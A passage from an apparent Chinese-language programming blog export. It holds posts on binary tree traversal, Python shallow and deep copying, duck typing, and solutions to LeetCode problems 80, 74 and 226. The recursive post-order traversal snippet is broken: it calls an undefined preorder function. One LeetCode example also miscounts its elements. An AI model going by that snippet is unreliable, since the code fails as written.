<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">in_order</span><span class="params">(self, root)</span>:</span></div><div class="line">    res = []</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    stack = []</div><div class="line">    <span class="keyword">while</span> root <span class="keyword">or</span> stack:</div><div class="line">        <span class="keyword">while</span> root:</div><div class="line">            stack.append(root)</div><div class="line">            root = root.left</div><div class="line">        root = stack.pop()</div><div class="line">        res.append(root.val)</div><div class="line">        root = root.right</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<h5 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h5><ul>
<li><strong>递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_order</span><span class="params">(self, root)</span>:</span></div><div class="line">    res = []</div><div class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line">    preorder(root.left, res)</div><div class="line">	preorder(root.right, res)</div><div class="line">    res.append(root.val)</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<ul>
<li><strong>非递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_order</span><span class="params">(self, root)</span>:</span></div><div class="line">    res_temp = []</div><div class="line">    res = []</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    stack = []</div><div class="line">    stack.append(root)</div><div class="line">    <span class="keyword">while</span> stack:</div><div class="line">        root = stack.pop()</div><div class="line">        res_temp.append(root.val)</div><div class="line">        <span class="keyword">if</span> root.left:</div><div class="line">            stack.append(root.left)</div><div class="line">        <span class="keyword">if</span> root.right:</div><div class="line">            stack.append(root.right)</div><div class="line">    <span class="keyword">while</span> res_temp:</div><div class="line">        res.append(res_temp.pop())</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<h5 id="层次遍历"><a href="#层次遍历" class="headerlink" title="层次遍历"></a>层次遍历</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">level_order</span><span class="params">(self, root)</span>:</span></div><div class="line">    res = []</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    level = [root]</div><div class="line">    <span class="keyword">while</span> level:</div><div class="line">        current = []</div><div class="line">        new_level = []</div><div class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> level:</div><div class="line">            current.append(node.val)</div><div class="line">            <span class="keyword">if</span> node.left:</div><div class="line">                new_level.append(node.left)</div><div class="line">            <span class="keyword">if</span> node.right:</div><div class="line">                new_level.append(node.right)</div><div class="line">        level = new_level</div><div class="line">        res.append(current)</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 浅拷贝与深拷贝</title>
    <url>/2019/01/20/Python-%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/</url>
    <content><![CDATA[<center>Python 赋值、浅拷贝与深拷贝总结。</center>

<a id="more"></a>
<h4 id="可变-不可变对象"><a href="#可变-不可变对象" class="headerlink" title="可变/不可变对象"></a>可变/不可变对象</h4><ul>
<li><strong>不可变对象，该对象所指向的内存中的值不能被改变。</strong>当改变某个变量时候，由于其所指的值不能被改变，相当于把原来的值复制一份后再改变，这会开辟一个新的地址，变量再指向这个新的地址。</li>
<li><strong>可变对象，该对象所指向的内存中的值可以被改变。</strong>变量（准确的说是引用）改变后，实际上是其所指的值直接发生改变，并没有发生复制行为，也没有开辟新的出地址，通俗点说就是<strong>原地改变</strong>。</li>
</ul>
<p>　　Python中，<strong>数值类型（int和float）、字符串str、元组tuple都是不可变类型。而列表list、字典dict、集合set是可变类型。</strong></p>
<h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><p>　　对于不可变对象(字符串、元组、数值)的赋值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">6</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b)</div><div class="line"><span class="number">6</span> <span class="number">6</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">2</span>   <span class="comment"># 修改a，b不变</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b)</div><div class="line"><span class="number">2</span> <span class="number">6</span></div></pre></td></tr></table></figure>
<p>　　对于可变对象(列表、字典、集合等)的赋值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b)</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]] [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>] = <span class="number">6</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b) <span class="comment"># 修改a中的值，b也变了</span></div><div class="line">[<span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]] [<span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div></pre></td></tr></table></figure>
<h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><p>　　在 python 中，标识一个对象唯一身份的是：对象的<code>id</code>(内存地址)，对象类型，对象值，而浅拷贝就是创建一个具有相同类型，相同值但不同<code>id</code>的新对象。</p>
<p>　　对可变对象而言，对象的值一样可能包含有对其他对象的引用，浅拷贝产生的新对象，虽然具有完全不同的<code>id</code>，但是其值若包含可变对象，这些对象和原始对象中的值包含同样的引用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = a.copy()    <span class="comment"># list的copy方法，浅拷贝</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b)</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]] [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>] = <span class="number">6</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b) <span class="comment"># 修改a中的不可变对象，b不变</span></div><div class="line">[<span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]] [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">3</span>].append(<span class="number">7</span>)  <span class="comment"># 修改a中的可变对象时，b也变了</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b)</div><div class="line">[<span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>]] [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>]]</div></pre></td></tr></table></figure>
<p>　　<code>list.copy()</code> 浅拷贝：复制此列表(只复制一层，不会复制深层对象) 等同于 L[:] 。如上所示，浅拷贝产生的新对象中可变对象的值在发生改变时会对原对象的值产生副作用，因为这些值是同一个引用。</p>
<p>　　浅拷贝仅仅对对象自身创建了一份拷贝，而没有在进一步处理对象中包含的值。因此使用浅拷贝的典型使用场景是：对象自身发生改变的同时需要保持对象中的值完全相同，比如 list 排序。</p>
<p>　　在 <code>copy</code> 模块中，也提供了 <code>copy</code> 方法可以完成浅拷贝。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy</div></pre></td></tr></table></figure>
<h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><p>　　列表没有深拷贝方法，但是 <code>copy</code> 模块中提供了 <code>deepcopy</code> 方法可以完成深拷贝。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</div></pre></td></tr></table></figure>
<p>　　相比于浅拷贝，深拷贝不仅仅拷贝了原始对象自身，也对其包含的值进行拷贝，它会递归的查找对象中包含的其他对象的引用，来完成更深层次拷贝。因此，深拷贝产生的副本可以随意修改而不需要担心会引起原始值的改变。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> copy <span class="comment"># list没有deepcopy方法</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = copy.deepcopy(a)    <span class="comment"># 深拷贝</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">3</span>].append(<span class="number">6</span>)  <span class="comment"># 即使修改a中的可变对象，b也不变</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(a, b)</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]] [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]</div></pre></td></tr></table></figure>
<p>　　值得注意的是，深拷贝并非完完全全递归查找所有对象，因为一旦对象引用了自身，完全递归可能会导致无限循环。一个对象被拷贝了，python 会对该对象做个标记，如果还有其他需要拷贝的对象引用着该对象，它们的拷贝其实指向的是同一份拷贝。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol>
<li><p>赋值是将一个对象的地址赋值给一个变量，让变量指向该地址（旧瓶装旧酒）。</p>
</li>
<li><p>浅拷贝是在另一块地址中创建一个新的变量或容器，但是容器内的元素的地址均是源对象的元素的地址的拷贝。也就是说新的容器中指向了旧的元素（新瓶装旧酒）。</p>
</li>
<li><p>深拷贝是在另一块地址中创建一个新的变量或容器，同时容器内的元素的地址也是新开辟的，仅仅是值相同而已，是完全的副本。也就是说（新瓶装新酒）。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 鸭子类型</title>
    <url>/2019/01/17/Python-%E9%B8%AD%E5%AD%90%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<center>Python 鸭子类型学习。</center>

<a id="more"></a>
<h4 id="类"><a href="#类" class="headerlink" title="类"></a>类</h4><p>　　类就是一组数据和函数的集合。创建了一个新的类意味着创建了一个全新的对象 <em>类型</em>，也就允许我们创建新的此类型的 <em>实例</em>。每个类实例都带有属性以维护其状态。同样也有方法（在它自己的类中定义）来修改这些状态。</p>
<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>　　<strong>继承</strong>可以让子类获得父类的全部功能，父类实现过的方法，子类不需要重新定义就能自动拥有。 当然也可以为子类增加新的方法，这些新方法父类不会掌握。 如果子类新定义的方法与父类的方法相同，则子类的方法覆盖父类的方法。在程序运行时总是会调用子类的方法而不是父类的方法。</p>
<h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>　　在继承关系中，如果一个实例的数据类型是某个子类，那它的数据类型也可以被看做是父类。但是，反过来就不行。子类的对象之所以能调用父类的方法，是因为子类是从父类继承而来，子类的实例既属于子类，也属于父类，这就叫做<strong>多态</strong>。多态的好处很明显：子类可以重写父类的方法；如果不重写，也可以直接调用父类的方法。</p>
<p>　　调用方只管调用，不管细节，不管原来的代码是如何调用的。 这就是“开闭”原则，对扩展开放：允许新增子类；对修改封闭：不需要修改依赖该类型的函数。 把不同的子类对象都当作父类来看，可以屏蔽不同子类对象之间的差异，写出通用的代码，做出通用的编程，以适应需求的不断变化。</p>
<p>　　关于 Python 支不支持多态，网上争议很多。其实，Python 是动态语言，根本用不着多态，Python崇尚的是“鸭子类型”（Duck typing），这个概念的名字来源于由 James Whitcomb Riley 提出的鸭子测试，“鸭子测试”可以这样表述：“当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。”</p>
<h4 id="鸭子类型"><a href="#鸭子类型" class="headerlink" title="鸭子类型"></a>鸭子类型</h4><p>　　在程序设计中，鸭子类型是动态类型的一种风格。在这种风格中，一个对象有效的语义，不是由继承自特定的类或实现特定的接口，而是由当前方法和属性的集合决定。</p>
<p>　　以一个经典的例子来进行说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Duck</span><span class="params">()</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">walk</span><span class="params">(self)</span>:</span></div><div class="line">    print(<span class="string">'I walk like a duck'</span>)</div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">swim</span><span class="params">(self)</span>:</span></div><div class="line">    print(<span class="string">'I swim like a duck'</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">()</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">walk</span><span class="params">(self)</span>:</span></div><div class="line">    print(<span class="string">'This man walk like a duck'</span>) </div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">swim</span><span class="params">(self)</span>:</span></div><div class="line">    print(<span class="string">'This man swim like a duck'</span>)</div></pre></td></tr></table></figure>
<p>　　Person 类拥有和 Duck 类一样的方法，当有一个函数调用 Duck 类，并利用到了 walk() 和 swim() 方法 。我们传入 Person 类的实例也一样可以运行，函数并不会检查对象的类型是不是 Duck，只要他拥有 walk() 和 swim() 方法，就可以正确的被调用。 </p>
<p>　　鸭子类型通常得益于不测试方法和函数中参数的类型，而是依赖文档、清晰的代码和测试来确保正确使用。Python中的鸭子类型允许我们使用任何提供所需方法的对象，而不需要迫使它成为一个子类。</p>
<p>　　Python作为动态语言对变量的类型不是太关注，因此不需要使用instance( )函数来判断变量的类型，Python的风格是在函数内部用try和except对变量的行为进行检测。对Python而言，“鸭子类型”使得继承不再是必不可少的东西。</p>
<p>　　Python 中“鸭子类型”的使用很普遍，如果一个对象实现了 <code>__getitem__</code> 方法，那python的解释器就会把它当做一个 collection，就可以在这个对象上使用切片，获取子项等方法；如果一个对象实现了 <code>__iter__</code> 和 next 方法，python 就会认为它是一个 iterator，就可以在这个对象上通过循环来获取各个子项。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>多态</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 80. Remove Duplicates from Sorted Array II</title>
    <url>/2019/01/14/LeetCode-80-Remove-Duplicates-from-Sorted-Array-II/</url>
    <content><![CDATA[<center>LeetCode 80. Remove Duplicates from Sorted Array II 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given a sorted array <em>nums</em>, remove the duplicates <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="external"><strong>in-place</strong></a> such that duplicates appeared at most <em>twice</em> and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this by <strong>modifying the input array in-place</strong> with O(1) extra memory.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个排序数组，你需要在<strong>原地</strong>删除重复出现的元素，使得每个元素最多出现两次，返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在<strong>原地修改输入数组</strong>并在使用 O(1) 额外空间的条件下完成。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">给定 nums = [1,1,1,2,2,3],</div><div class="line"></div><div class="line">函数应返回新长度 length = 5, 并且原数组的前五个元素被修改为 1, 1, 2, 2, 3 。</div><div class="line"></div><div class="line">你不需要考虑数组中超出新长度后面的元素。</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">给定 nums = [0,0,1,1,1,1,2,3,3],</div><div class="line"></div><div class="line">函数应返回新长度 length = 7, 并且原数组的前五个元素被修改为 0, 0, 1, 1, 2, 3, 3 。</div><div class="line"></div><div class="line">你不需要考虑数组中超出新长度后面的元素。</div></pre></td></tr></table></figure>
<p><strong>说明:</strong></p>
<p>为什么返回数值是整数，但输出的答案是数组呢?</p>
<p>请注意，输入数组是以<strong>“引用”</strong>方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p>
<p>你可以想象内部操作如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝</div><div class="line">int len = removeDuplicates(nums);</div><div class="line"></div><div class="line">// 在函数里修改输入数组对于调用者是可见的。</div><div class="line">// 根据你的函数返回的长度, 它会打印出数组中该长度范围内的所有元素。</div><div class="line">for (int i = 0; i &lt; len; i++) &#123;</div><div class="line">    print(nums[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　双指针，指向同一个数组，但是指针 i 是数组的索引，而 j 是结果的索引，检查 i 指向的元素是否与 j 指向的元素相同，如果相同则计数。如果i 指向的元素是否与 j 指向的元素不同，或者相等时的计数小于2，则 j 右移，并将 i 指向的元素复制到 j 指向的位置。如果计数大于等于2，则不做处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> len(nums) == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        j = <span class="number">0</span></div><div class="line">        count = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(nums)):</div><div class="line">            <span class="keyword">if</span> nums[i] == nums[j]:</div><div class="line">                count += <span class="number">1</span></div><div class="line">                <span class="keyword">if</span> count &lt; <span class="number">2</span>:</div><div class="line">                    j += <span class="number">1</span></div><div class="line">                    nums[j] = nums[i]</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                j += <span class="number">1</span></div><div class="line">                nums[j] = nums[i]</div><div class="line">                count = <span class="number">0</span></div><div class="line">        <span class="keyword">return</span> j+<span class="number">1</span></div></pre></td></tr></table></figure>
<p>　　<strong>题解 2</strong></p>
<p>　　还是采用双指针，i 指向第 1 个元素，为满足题目每个元素最多出现两次的要求，j 指向 i 之后的第 2 个元素，每次判断 i 和 j 所指元素是否相等，如果相等，则删除 j 指向的元素，否则，i 和 j 都向右移动，直到 j 到达 列表 nums 的末尾即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        i = <span class="number">0</span></div><div class="line">        j = <span class="number">2</span></div><div class="line">        <span class="keyword">while</span> j &lt; len(nums):</div><div class="line">            <span class="keyword">if</span> nums[i] == nums[j]:</div><div class="line">                <span class="keyword">del</span> nums[j]  <span class="comment"># 删除出现次数超过 2 次的元素</span></div><div class="line">            <span class="keyword">else</span>:  <span class="comment"># 向右扫描</span></div><div class="line">                i += <span class="number">1</span></div><div class="line">                j += <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> len(nums)</div></pre></td></tr></table></figure>
<p>　　另一种写法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:	<span class="comment"># 遍历数组，并向右扫描</span></div><div class="line">            <span class="keyword">if</span> j &lt; <span class="number">2</span> <span class="keyword">or</span> i != nums[j - <span class="number">2</span>]:	<span class="comment"># 判断出现次数是否小于 2 次</span></div><div class="line">                nums[j] = i</div><div class="line">                j += <span class="number">1</span></div><div class="line"></div><div class="line">        <span class="keyword">return</span> j</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 74. Search a 2D Matrix</title>
    <url>/2019/01/13/LeetCode-74-Search-a-2D-Matrix/</url>
    <content><![CDATA[<center>LeetCode 74. Search a 2D Matrix 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Write an efficient algorithm that searches for a value in an <em>m</em> x <em>n</em> matrix. This matrix has the following properties:</p>
<ul>
<li>Integers in each row are sorted from left to right.</li>
<li>The first integer of each row is greater than the last integer of the previous row.</li>
<li><strong>中文：</strong> </li>
</ul>
<p>编写一个高效的算法来判断 <em>m</em> x <em>n</em> 矩阵中，是否存在一个目标值。该矩阵具有如下特性：</p>
<ul>
<li>每行中的整数从左到右按升序排列。</li>
<li>每行的第一个整数大于前一行的最后一个整数。</li>
</ul>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入:</div><div class="line">matrix = [</div><div class="line">  [1,   3,  5,  7],</div><div class="line">  [10, 11, 16, 20],</div><div class="line">  [23, 30, 34, 50]</div><div class="line">]</div><div class="line">target = 3</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入:</div><div class="line">matrix = [</div><div class="line">  [1,   3,  5,  7],</div><div class="line">  [10, 11, 16, 20],</div><div class="line">  [23, 30, 34, 50]</div><div class="line">]</div><div class="line">target = 13</div><div class="line">输出: false</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　利用矩阵的如下特性：（1）每行中的整数从左到右按升序排列。（2）每行的第一个整数大于前一行的最后一个整数。我们从右上角开始扫描，比较元素与目标值，如果大于目标值，则向下扫描，如果小于则向左扫描，否则返回True。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchMatrix</span><span class="params">(self, matrix, target)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type matrix: List[List[int]]</div><div class="line">        :type target: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> len(matrix) == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">elif</span> len(matrix[<span class="number">0</span>]) == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            row = <span class="number">0</span></div><div class="line">            col = len(matrix[<span class="number">0</span>])<span class="number">-1</span></div><div class="line">            <span class="keyword">while</span> row &lt; len(matrix) <span class="keyword">and</span> col &gt;= <span class="number">0</span>:	<span class="comment"># 扫描完毕条件</span></div><div class="line">                <span class="keyword">if</span> target &gt; matrix[row][col]:	<span class="comment"># 目标值大于当前元素</span></div><div class="line">                    row += <span class="number">1</span>	<span class="comment"># 向下移动</span></div><div class="line">                <span class="keyword">elif</span> target &lt; matrix[row][col]:	<span class="comment"># 目标值小于当前元素</span></div><div class="line">                    col -= <span class="number">1</span>	<span class="comment"># 向左移动</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　使用二分法。先通过比较目标值与每行第一个数组定位目标值在在哪一行，然后锁定某一行后再对那一行进行二分查找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchMatrix</span><span class="params">(self, matrix, target)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type matrix: List[List[int]]</div><div class="line">        :type target: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        row = len(matrix)</div><div class="line">        <span class="keyword">if</span> row == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        col = len(matrix[<span class="number">0</span>])</div><div class="line">        <span class="keyword">if</span> col == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="comment"># 先定位大致在哪一行</span></div><div class="line">            row_index = row - <span class="number">1</span></div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(row):</div><div class="line">                <span class="keyword">if</span> target &lt; matrix[i][<span class="number">0</span>]:</div><div class="line">                    row_index = i - <span class="number">1</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line">            <span class="comment"># 在这一行，再用二分法查找</span></div><div class="line">            left, right = <span class="number">0</span>, col - <span class="number">1</span></div><div class="line">            <span class="keyword">while</span> left &lt;= right:</div><div class="line">                mid = int((left + right) / <span class="number">2</span>)</div><div class="line">                <span class="keyword">if</span> matrix[row_index][mid] == target:</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">                <span class="keyword">elif</span> matrix[row_index][mid] &lt; target:</div><div class="line">                    left = mid + <span class="number">1</span>  <span class="comment"># 在右半部分</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    right = mid - <span class="number">1</span>  <span class="comment"># 在左半部分</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 226. Invert Binary Tree</title>
    <url>/2019/01/12/LeetCode-226-Invert-Binary-Tree/</url>
    <content><![CDATA[<center>LeetCode 226. Invert Binary Tree 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Invert a binary tree.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>翻转一棵二叉树。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">     4</div><div class="line">   /   \</div><div class="line">  2     7</div><div class="line"> / \   / \</div><div class="line">1   3 6   9</div></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">     4</div><div class="line">   /   \</div><div class="line">  7     2</div><div class="line"> / \   / \</div><div class="line">9   6 3   1</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
